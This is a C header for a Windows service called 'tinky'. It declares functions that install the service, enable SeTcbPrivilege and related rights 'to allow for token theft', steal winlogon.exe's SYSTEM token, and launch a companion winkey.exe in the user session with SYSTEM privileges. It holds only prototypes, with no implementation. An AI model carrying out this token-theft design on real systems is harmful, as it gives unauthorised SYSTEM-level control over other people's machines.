/**
 * @file tinky.h
 * @brief Global header file containing common inclusions, definitions, global variables,
 *        and function prototypes for the tinky service.
 */

#ifndef TINKY_H
#define TINKY_H

#include <windows.h>
#include <tlhelp32.h>   /* For CreateToolhelp32Snapshot, PROCESSENTRY32 */
#include <stdio.h>
#include <string.h>
#include <WtsApi32.h>
#include <UserEnv.h>
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")


/* ---------- configuration ---------- */
#define SERVICE_NAME          "tinky"
#define SERVICE_DISPLAY_NAME  "Tinky"
#define SINGLE_INSTANCE_MUTEX "Global\\Winkey_SingleInstance_Mutex"

/* ---------- global variables ---------- */
extern SERVICE_STATUS        g_ServiceStatus;
extern SERVICE_STATUS_HANDLE g_StatusHandle;
extern HANDLE                g_ServiceStopEvent;

extern PROCESS_INFORMATION   g_WinkeyProcInfo;
extern HANDLE                g_SingleInstanceMutex;
extern CRITICAL_SECTION      g_ProcLock;

/* ---------- function prototypes ---------- */

/* 
 * SCM Management (src/scm.c)
 * Functions to interact with the Windows Service Control Manager to install,
 * start, stop, and delete the "tinky" service.
 */

/**
 * @brief Registers/installs the "tinky" service with the Windows Service Control Manager.
 *        Requires administrator privileges.
 */
void InstallService(void);

/**
 * @brief Sends a start signal to the "tinky" service via the SCM.
 */
void StartServiceByName(void);

/**
 * @brief Sends a stop signal to the "tinky" service via the SCM.
 */
void StopServiceByName(void);

/**
 * @brief Stops (if running) and deletes the "tinky" service from SCM registration.
 */
void DeleteServiceByName(void);


/* 
 * Privilege & Token Management (src/token.c)
 * Helper functions to adjust privileges, find target processes, and acquire system tokens.
 */

/**
 * @brief Enables a specific Windows security privilege for a given process token.
 * 
 * @param hToken Handle to the access token that contains the privileges to be modified.
 * @param privName Name of the privilege to enable (e.g., SE_TCB_NAME).
 * @return BOOL TRUE on success, FALSE on failure.
 */
BOOL EnablePrivilege(HANDLE hToken, const char *privName);

/**
 * @brief Enables the required security privileges (SeTcbPrivilege, SeAssignPrimaryTokenPrivilege,
 *        SeIncreaseQuotaPrivilege) on the current process token to allow for token theft.
 * 
 * @return BOOL TRUE if all privileges were enabled, FALSE otherwise.
 */
BOOL EnableRequiredPrivileges(void);

/**
 * @brief Iterates through active processes to find the PID matching a given executable name.
 * 
 * @param processName The name of the process to find (e.g., "winlogon.exe").
 * @return DWORD The Process ID if found, or 0 if not found.
 */
DWORD FindProcessId(const char *processName);

/**
 * @brief Locates "winlogon.exe", opens its process, steals its SYSTEM token, and duplicates it.
 * 
 * @return HANDLE Duplicate primary token with SYSTEM privileges, or NULL on failure.
 */
HANDLE StealWinlogonToken(void);


/* 
 * Winkey Process Management (src/winkey.c)
 * Handles launching, terminating, and locating the winkey.exe executable.
 */

/**
 * @brief Constructs the absolute path to the "winkey.exe" file based on the service's current location.
 * 
 * @param outPath Buffer to store the constructed path.
 * @param outSize Size of the destination buffer.
 */
void BuildWinkeyPath(char *outPath, DWORD outSize);

/**
 * @brief Spawns "winkey.exe" under Session 1 with SYSTEM privileges.
 *        Ensures a single instance runs using a global mutex.
 * 
 * @return BOOL TRUE if the process was successfully launched, FALSE otherwise.
 */
BOOL StartWinkey(void);

/**
 * @brief Gracefully terminates the running "winkey.exe" process and releases its associated mutex.
 */
void StopWinkey(void);


/* 
 * Service Plumbing (src/service.c)
 * Implements the standard entry points, control handlers, and worker loops for a Windows Service.
 */

/**
 * @brief The main entry point function for the tinky service.
 *        Registered with the Service Control Manager.
 * 
 * @param argc Number of command-line arguments.
 * @param argv Array of command-line arguments.
 */
VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv);

/**
 * @brief Extended handler function to control events like STOP and SHUTDOWN sent by SCM.
 * 
 * @param dwCtrl The control code requested (e.g. SERVICE_CONTROL_STOP).
 * @param dwEventType Type of event.
 * @param lpEventData Additional event data.
 * @param lpContext User-defined context.
 * @return DWORD Win32 error code.
 */
DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwCtrl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);

/**
 * @brief Background worker thread that monitors service execution and performs periodic tasks.
 * 
 * @param lpParam User parameters.
 * @return DWORD Thread exit code.
 */
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

/**
 * @brief Updates the status of the service to the Service Control Manager.
 * 
 * @param dwCurrentState The new state of the service (e.g., SERVICE_RUNNING).
 */
void ReportServiceStatus(DWORD dwCurrentState);

#endif /* TINKY_H */
